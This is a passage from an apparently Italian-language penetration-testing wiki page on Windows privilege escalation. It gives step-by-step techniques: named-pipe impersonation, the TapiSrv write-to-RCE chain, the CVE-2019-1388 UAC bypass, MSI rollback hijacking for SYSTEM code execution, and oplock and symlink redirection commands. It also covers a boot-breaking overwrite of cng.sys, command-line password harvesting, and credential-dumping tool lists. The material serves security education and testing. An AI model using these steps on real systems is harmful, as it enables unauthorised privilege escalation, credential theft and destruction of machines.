Windows fornisce una funzionalità chiamata **Named Pipes**, che permette a processi non correlati di condividere dati, anche tra reti diverse. Questo somiglia a un'architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando i dati vengono inviati attraverso una pipe da un **client**, il **server** che ha creato la pipe può **assumere l'identità** del **client**, purché abbia i diritti necessari **SeImpersonate**. Individuare un **processo privilegiato** che comunica tramite una pipe che puoi emulare offre l'opportunità di **ottenere privilegi più elevati** assumendo l'identità di quel processo quando interagisce con la pipe che hai creato. Per istruzioni su come eseguire questo attacco, guide utili si trovano [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Inoltre, il seguente tool permette di **intercettare una comunicazione di named pipe con uno strumento come burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo tool permette di elencare e vedere tutte le pipe per trovare privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Il servizio Telephony (TapiSrv) in modalità server espone `\\pipe\\tapsrv` (MS-TRP). Un client remoto autenticato può abusare del percorso di eventi asincroni basato su mailslot per trasformare `ClientAttach` in una scrittura arbitraria di **4-byte** su qualsiasi file esistente scrivibile da `NETWORK SERVICE`, quindi ottenere i diritti di amministratore Telephony e caricare una DLL arbitraria come servizio. Flusso completo:

- `ClientAttach` con `pszDomainUser` impostato su un percorso esistente scrivibile → il servizio lo apre via `CreateFileW(..., OPEN_EXISTING)` e lo usa per le scritture di eventi asincroni.
- Ogni evento scrive l'`InitContext` controllato dall'attaccante proveniente da `Initialize` su quell'handle. Registra una line app con `LRegisterRequestRecipient` (`Req_Func 61`), genera `TRequestMakeCall` (`Req_Func 121`), recupera tramite `GetAsyncEvents` (`Req_Func 0`), quindi deregistrati/arresta per ripetere scritture deterministiche.
- Aggiungiti a `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, riconnettiti, poi chiama `GetUIDllName` con il percorso di una DLL arbitraria per eseguire `TSPI_providerUIIdentify` come `NETWORK SERVICE`.

Maggiori dettagli:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varie

### Estensioni di file che possono eseguire codice in Windows

Vedi la pagina **[https://filesec.io/](https://filesec.io/)**

### **Monitorare le righe di comando per password**

Quando si ottiene una shell come utente, potrebbero esserci attività pianificate o altri processi in esecuzione che **passano credenziali nella riga di comando**. Lo script qui sotto cattura le righe di comando dei processi ogni due secondi e confronta lo stato corrente con quello precedente, stampando eventuali differenze.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se hai accesso all'interfaccia grafica (tramite console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" da un utente non privilegiato.

Questo rende possibile elevare i privilegi e bypassare UAC contemporaneamente sfruttando la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binary usato durante il processo è firmato e rilasciato da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Da Administrator Medium a High Integrity Level / UAC Bypass

Leggi questo per **imparare gli Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Poi **leggi questo per imparare su UAC e UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Da Arbitrary Folder Delete/Move/Rename a SYSTEM EoP

La tecnica descritta [**in questo post sul blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un exploit code [**disponibile qui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attacco consiste fondamentalmente nell'abusare della rollback feature di Windows Installer per sostituire file legittimi con file dannosi durante il processo di uninstall. Per questo l'attaccante deve creare un **malicious MSI installer** che verrà usato per hijackare la cartella `C:\Config.Msi`, che più tardi verrà usata da Windows Installer per memorizzare i rollback files durante la disinstallazione di altri pacchetti MSI dove i rollback files sarebbero stati modificati per contenere il payload maligno.

La tecnica riassunta è la seguente:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Questo stream memorizza i **metadati dell'indice** della cartella.

Quindi, se **elimini lo stream `::$INDEX_ALLOCATION`** di una cartella, NTFS **rimuove l'intera cartella** dal file system.

Puoi farlo usando le API standard di cancellazione file come:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Anche se stai chiamando un'API di cancellazione di *file*, essa **cancella la cartella stessa**.

### Dalla Folder Contents Delete alla SYSTEM EoP
E se la tua primitive non ti consente di cancellare file/cartelle arbitrari, ma **ti permette di cancellare il *contenuto* di una cartella controllata dall'attaccante**?

1. Step 1: Prepara una cartella esca e un file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Poni un **oplock** su `file1.txt`
- L'oplock **mette in pausa l'esecuzione** quando un processo privilegiato tenta di cancellare `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Passo 3: Trigger il processo SYSTEM (es., `SilentCleanup`)
- Questo processo scansiona cartelle (es., `%TEMP%`) e tenta di eliminare il loro contenuto.
- Quando raggiunge `file1.txt`, l'**oplock triggers** e cede il controllo alla tua callback.

4. Passo 4: All'interno della callback dell'oplock – reindirizzare la cancellazione

- Opzione A: Spostare `file1.txt` altrove
- Questo svuota `folder1` senza rompere l'oplock.
- Non cancellare `file1.txt` direttamente — questo rilascierebbe l'oplock prematuramente.

- Opzione B: Convertire `folder1` in una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opzione C: Crea un **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Questo prende di mira lo stream interno NTFS che memorizza i metadati della cartella — eliminarlo elimina la cartella.

5. Passo 5: Rilascia l'oplock
- Il processo SYSTEM continua e prova a eliminare `file1.txt`.
- Ma ora, a causa della junction + symlink, sta effettivamente cancellando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Risultato**: `C:\Config.Msi` viene eliminato da SYSTEM.

### Da Arbitrary Folder Create a DoS permanente

Sfrutta una primitiva che ti permette di **creare una cartella arbitraria come SYSTEM/admin** — anche se **non puoi scrivere file** o **impostare permessi deboli**.

Crea una **cartella** (non un file) con il nome di un **driver critico di Windows**, ad esempio:
```
C:\Windows\System32\cng.sys
```
- Questo percorso corrisponde normalmente al driver in modalità kernel `cng.sys`.
- Se lo **precrei come cartella**, Windows non riesce a caricare il driver effettivo all'avvio.
- Poi, Windows tenta di caricare `cng.sys` durante l'avvio.
- Vede la cartella, **non riesce a risolvere il driver effettivo**, e **va in crash o blocca l'avvio**.
- Non c'è **fallback**, e **nessun recupero** senza intervento esterno (es. riparazione dell'avvio o accesso al disco).

### Dai percorsi di log/backup privilegiati + OM symlinks a sovrascrittura arbitraria di file / boot DoS

Quando un **servizio privilegiato** scrive log/export in un percorso letto da una **config scrivibile**, reindirizza quel percorso con **Object Manager symlinks + NTFS mount points** per trasformare la scrittura privilegiata in una sovrascrittura arbitraria (anche **senza** SeCreateSymbolicLinkPrivilege).

**Requisiti**
- La config che memorizza il percorso di destinazione è scrivibile dall'attaccante (es. `%ProgramData%\...\.ini`).
- Capacità di creare un mount point a `\RPC Control` e un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Un'operazione privilegiata che scrive su quel percorso (log, export, report).

**Catena di esempio**
1. Leggi la config per recuperare la destinazione del log privilegiato, es. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Reindirizza il percorso senza admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendi che il componente privilegiato scriva il log (es., l'amministratore avvia "send test SMS"). La scrittura ora finisce in `C:\Windows\System32\cng.sys`.
4. Ispeziona il target sovrascritto (hex/PE parser) per confermare la corruzione; il reboot forza Windows a caricare il driver manomesso → **boot loop DoS**. Questo si estende anche a qualsiasi file protetto che un servizio privilegiato aprirà in scrittura.

> `cng.sys` è normalmente caricato da `C:\Windows\System32\drivers\cng.sys`, ma se esiste una copia in `C:\Windows\System32\cng.sys` può essere tentata per prima, rendendola un sink DoS affidabile per dati corrotti.



## **Da High Integrity a SYSTEM**

### **Nuovo servizio**

Se stai già eseguendo un processo High Integrity, il **percorso verso SYSTEM** può essere semplice semplicemente **creando ed eseguendo un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Quando crei un service binary assicurati che sia un servizio valido o che il binario esegua le azioni necessarie rapidamente, poiché verrà terminato dopo 20s se non è un servizio valido.

### AlwaysInstallElevated

Da un processo High Integrity puoi provare a **abilitare le chiavi di registro AlwaysInstallElevated** e **installare** una reverse shell usando un wrapper _**.msi**_.\
[Ulteriori informazioni sulle chiavi di registro coinvolte e su come installare un pacchetto _.msi_ qui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puoi** [**trovare il codice qui**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se hai quei privilegi di token (probabilmente li troverai in un processo già High Integrity), sarai in grado di **aprire quasi qualsiasi processo** (esclusi i protected processes) con il privilegio SeDebug, **copiare il token** del processo e creare un **processo arbitrario con quel token**.\
Usando questa tecnica di solito si **seleziona un processo in esecuzione come SYSTEM con tutti i privilegi di token** (_sì, puoi trovare processi SYSTEM senza tutti i privilegi di token_).\
**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica è usata da meterpreter per escalare in `getsystem`. La tecnica consiste nel **creare una pipe e poi creare/abusare un service per scrivere su quella pipe**. Poi, il **server** che ha creato la pipe usando il privilegio **`SeImpersonate`** sarà in grado di **impersonare il token** del client della pipe (il service) ottenendo privilegi SYSTEM.\
Se vuoi [**approfondire i named pipes dovresti leggere questo**](#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**come passare da High Integrity a System usando i named pipes dovresti leggere questo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **hijackare una dll** che viene **caricata** da un **processo** in esecuzione come **SYSTEM** sarai in grado di eseguire codice arbitrario con quei permessi. Pertanto Dll Hijacking è utile per questo tipo di escalation di privilegi e, inoltre, è molto **più facile da ottenere da un processo High Integrity** poiché avrà **permessi di scrittura** sulle cartelle usate per il caricamento delle dll.\
**Puoi** [**approfondire Dll hijacking qui**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Ulteriori informazioni

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Strumenti utili

**Miglior strumento per cercare vettori di Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Controlla misconfigurazioni e file sensibili (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Controlla alcune possibili misconfigurazioni e raccoglie info (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Controlla misconfigurazioni**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae informazioni sulle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae credenziali dal Credential Manager. Rilevato.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spraya le password raccolte attraverso il domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è un PowerShell ADIDNS/LLMNR/mDNS spoofer e tool man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione base Windows per privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Cerca vulnerabilità note di privesc (DEPRECATED per Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(Necessita privilegi Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità note di privesc (deve essere compilato usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando misconfigurazioni (più uno strumento di raccolta info che di privesc) (necessita compilazione) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credenziali da molti software (exe precompilato su github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port di PowerUp in C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Controlla misconfigurazioni (eseguibile precompilato su github). Non raccomandato. Non funziona bene su Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Controlla possibili misconfigurazioni (exe da python). Non raccomandato. Non funziona bene su Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato basato su questo post (non richiede accesschk per funzionare correttamente ma può usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e suggerisce exploit funzionanti (python locale)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e suggerisce exploit funzionanti (python locale)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Devi compilare il progetto usando la versione corretta di .NET ([vedi questo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per vedere la versione di .NET installata sull'host vittima puoi fare:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Riferimenti

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
